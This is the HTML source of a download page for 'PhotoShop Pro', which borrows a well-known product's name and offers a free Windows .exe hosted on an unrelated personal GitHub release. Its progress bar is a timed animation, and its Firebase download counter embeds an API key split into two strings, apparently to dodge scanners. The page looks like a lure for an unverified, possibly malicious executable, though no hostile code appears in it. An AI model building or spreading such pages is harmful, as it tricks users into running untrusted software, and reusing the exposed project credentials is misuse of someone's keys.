<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>PhotoShop Pro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Download PhotoShop Pro, an ultra-light and lightning-fast photo editing tool, completely free!" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #1c1c2d, #080813);
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      position: relative;
    }

    canvas#particle-bg {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .bubble {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      animation: float 20s infinite ease-in-out;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.15);
    }

    .bubble:nth-child(1) {
      width: 150px;
      height: 150px;
      top: 20%;
      left: 15%;
      animation-duration: 22s;
    }

    .bubble:nth-child(2) {
      width: 250px;
      height: 250px;
      bottom: 15%;
      right: 10%;
      animation-duration: 28s;
    }

    .bubble:nth-child(3) {
      width: 120px;
      height: 120px;
      top: 60%;
      left: 70%;
      animation-duration: 25s;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0) scale(1); }
      50% { transform: translateY(-50px) rotate(60deg) scale(1.05); }
    }

    .container {
      z-index: 1;
      padding: 60px 40px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 24px;
      backdrop-filter: blur(20px);
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
      text-align: center;
      animation: fadeIn 1.2s ease-out forwards;
      max-width: 460px;
      width: 90%;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .container:hover {
      transform: translateY(-10px);
      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.9); }
      100% { opacity: 1; transform: scale(1); }
    }

    h1 {
      font-size: 3.5rem;
      font-weight: 800;
      margin-bottom: 20px;
      color: #fff;
      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
    }

    p {
      font-size: 1.2rem;
      margin-bottom: 30px;
      color: #e0e0e0;
      line-height: 1.6;
    }

    .download-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 18px 40px;
      gap: 12px;
      font-size: 18px;
      font-weight: 600;
      color: #fff;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      border: none;
      border-radius: 60px;
      text-decoration: none;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
    }

    .download-btn:hover {
      transform: scale(1.1);
      box-shadow: 0 8px 25px rgba(0, 114, 255, 0.6);
    }

    .download-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 200%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.3),
        transparent
      );
      transition: left 0.5s ease;
    }

    .download-btn:hover::before {
      left: 100%;
    }

    .download-btn.downloading::after {
      content: '';
      position: absolute;
      width: 24px;
      height: 24px;
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .download-progress {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #dcdcdc;
      display: none;
    }

    .download-progress.active {
      display: block;
    }

    .progress-bar {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 3px;
      overflow: hidden;
      margin-top: 10px;
    }

    .progress-bar-fill {
      width: 0;
      height: 100%;
      background: #00c6ff;
      transition: width 0.3s ease;
    }

    .download-counter {
      margin-top: 15px;
      font-size: 0.85rem;
      color: #b0b0b0;
    }

    @media (max-width: 480px) {
      .container {
        padding: 40px 20px;
      }

      h1 {
        font-size: 2.5rem;
      }

      p {
        font-size: 1rem;
      }

      .download-btn {
        padding: 14px 30px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <canvas id="particle-bg"></canvas>
  <div class="background">
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
  </div>
  <div class="container" role="main" aria-labelledby="main-title">
    <h1 id="main-title">PhotoShop Pro</h1>
    <p>Ultra-light, lightning-fast photo editing. Free to download â€” no strings attached.</p>
    <a
      href="https://github.com/allana1112/ss/releases/download/v1.0/PhotoShop.exe"
      class="download-btn"
      download
      aria-label="Download PhotoShop Pro"
    >
      <i class="fa-solid fa-download"></i> Download Now
    </a>
    <div class="download-progress">
      <span>Downloading...</span>
      <div class="progress-bar">
        <div class="progress-bar-fill"></div>
      </div>
    </div>
    <div class="download-counter">Downloaded <span id="download-count">0</span> times</div>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

  <script>
    // Firebase configuration (Replace with your Firebase project config)
    // To get this, go to Firebase Console > Project Settings > General > Your Apps > Add App (Web)
    // Copy the firebaseConfig object here
const firebaseConfig = {
  apiKey: "AIza" + "SyCT7JB-LgpQjbXdtxH-Dks9jVe9a3aGeCk",
  authDomain: "gamedeva.firebaseapp.com",
  databaseURL: "https://gamedeva-default-rtdb.firebaseio.com",
  projectId: "gamedeva",
  storageBucket: "gamedeva.appspot.com", // <-- fixed this line
  messagingSenderId: "276518321703",
  appId: "1:276518321703:web:d2a1b4308e8c3aa128d802",
  measurementId: "G-E099142RBV"
};

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const downloadCountRef = database.ref('downloadCount');

    // Particle background
    const canvas = document.getElementById('particle-bg');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particles = [];
    const particleCount = 100;

    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 3 + 1;
        this.speedX = Math.random() * 0.5 - 0.25;
        this.speedY = Math.random() * 0.5 - 0.25;
      }

      update() {
        this.x += this.speedX;
        this.y += this.speedY;

        if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
        if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
      }

      draw() {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    function initParticles() {
      for (let i = 0; i < particleCount; i++) {
        particles.push(new Particle());
      }
    }

    function animateParticles() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach(particle => {
        particle.update();
        particle.draw();
      });
      requestAnimationFrame(animateParticles);
    }

    initParticles();
    animateParticles();

    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });

    // Download button interaction and counter
    const downloadBtn = document.querySelector('.download-btn');
    const progressBarFill = document.querySelector('.progress-bar-fill');
    const downloadProgress = document.querySelector('.download-progress');
    const downloadCountSpan = document.getElementById('download-count');

    // Fetch and display initial download count
    downloadCountRef.on('value', (snapshot) => {
      const count = snapshot.val() || 0;
      downloadCountSpan.textContent = count.toLocaleString();
    });

    downloadBtn.addEventListener('click', () => {
      // Increment download count in Firebase
      downloadCountRef.transaction((currentCount) => {
        return (currentCount || 0) + 1;
      });

      // Show progress animation
      downloadBtn.classList.add('downloading');
      downloadProgress.classList.add('active');

      let progress = 0;
      const interval = setInterval(() => {
        progress += 10;
        progressBarFill.style.width = `${progress}%`;
        if (progress >= 100) {
          clearInterval(interval);
          downloadBtn.classList.remove('downloading');
          downloadProgress.classList.remove('active');
          progressBarFill.style.width = '0%';
        }
      }, 300);
    });
  </script>
</body>
</html>
